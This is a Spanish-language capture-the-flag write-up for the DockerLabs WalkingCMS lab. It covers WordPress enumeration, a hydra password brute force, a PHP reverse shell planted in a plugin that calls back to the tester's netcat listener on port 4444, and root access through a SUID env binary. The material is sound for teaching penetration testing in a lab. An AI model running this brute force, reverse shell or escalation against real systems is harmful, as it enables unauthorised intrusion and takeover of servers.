---
title: DockerLabs - WalkingCMS
summary: "Write-up del laboratorio WalkingCMS de DockerLabs"
author: elcybercurioso
date: 2025-11-09
categories: [Post, DockerLabs]
tags: [fácil, wordpress, cms, brute force, rce, suid]
media_subpath: "/assets/img/posts/dockerlabs_walkingcms"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/WalkingCMS]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/WalkingCMS]
└─$ nmap -sCV -p80 172.17.0.2                                     
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
```

## análisis

Comenzamos revisando posibles recursos disponibles en el servidor con `nmap`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/WalkingCMS]
└─$ nmap --script http-enum 172.17.0.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:02 GMT
Nmap scan report for bicho.dl (172.17.0.2)
Host is up (0.000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.91 seconds
```

Vemos que hay un WordPress disponible:

![Desktop View](/20251108230337.webp){: width="972" height="589" .shadow}

Sabiendo esto, ejecutamos `wpscan` para buscar posibles formas de entrada:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/WalkingCMS]
└─$ wpscan --url http://172.17.0.2/wordpress --detection-mode aggressive -e ap,at,u -t 32
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | `_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Sat Nov  8 22:38:37 2025

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.17.0.2/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.3 identified (Latest, released on 2025-09-30).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="6.8.3">WordPress</generator>
 | Confirmed By: Opml Generator (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/wp-links-opml.php, Match: 'generator="WordPress/6.8.3"'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] mario
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

Nos revela que hay un usuario llamado `mario`, el cual es válido, y sobre el cual podemos, por fuerza bruta, tratar de obtener su contraseña empleando `hydra`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/WalkingCMS]
└─$ hydra -l mario -P /usr/share/seclists/Passwords/rockyou.txt 172.17.0.2 http-post-form "/wordpress/wp-login.php:log=mario&pwd=^PASS^&wp-submit=Acceder&redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&testcookie=1:no es correcta" -t 64 -I

[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/wordpress/wp-login.php:log=mario&pwd=^PASS^&wp-submit=Acceder&redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&testcookie=1:no es correcta
[80][http-post-form] host: 172.17.0.2   login: mario   password: l***
1 of 1 target successfully completed, 1 valid password found
```

Tras un rato, obtenemos la contraseña, y nos logueamos:

![Desktop View](/20251109115302.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Para obtener una consola remota, emplearemos el plugin `Hello Dolly`, ya que dispone de un script en PHP, el cual podemos editar, y posteriormente, ejecutarlo:

![Desktop View](/20251109120305.webp){: width="972" height="589" .shadow}

Usaremos el script [PHP Reverse Shell MonkeyPentest](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), el cual debemos modificar, indicando la IP a la que queremos apuntar (la de nuestra máquina, en mi caso 172.17.0.1), y el puerto destino (que en mi caso, he usado el 4444):

![Desktop View](/20251109120838.webp){: width="972" height="589" .shadow}

Tras actualizar el script, si ya nos hemos puesto en escucha, veremos que nos habrá devuelto una consola remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/WalkingCMS]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 55384
Linux 2655cda838d9 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64 GNU/Linux
 11:09:06 up 1 day, 27 min,  0 user,  load average: 1.22, 2.22, 1.95
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can`t access tty; job control turned off
$ whoamiu
/bin/sh: 1: whoamiu: not found
$ whoami
www-data
$ hostname -I
172.17.0.2
```

Procedemos a tratar la TTY para tener una consola plenamente funcional:

```bash
$ script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@2655cda838d9:/$ ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                        
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/WalkingCMS]
└─$ stty raw -echo;fg     
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@2655cda838d9:/$ export TERM=xterm
www-data@2655cda838d9:/$ export SHELL=bash
www-data@2655cda838d9:/$ stty rows 48 columns 210
```

## escalada de privilegios (root)

Revisando los binario con permisos SUID, encontramos que `/usr/bin/env` dispone de dichos permisos:

```bash
www-data@2655cda838d9:/$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/env
/usr/bin/mount
/usr/bin/chsh
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) encontramos que cuando el binario `env` tiene permisos SUID, podemos llegar a obtener una consola como el propietario del binario empleando el siguiente comando:

![Desktop View](/20251109121709.webp){: width="972" height="589" .shadow}

Ejecutamos el comando que nos indican, y ya nos habremos convertido en `root`:

```bash
www-data@2655cda838d9:/$ env /bin/bash -p
bash-5.2# whoami
root
```

Y con esto concluye la resolución del laboratorio WalkingCMS!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>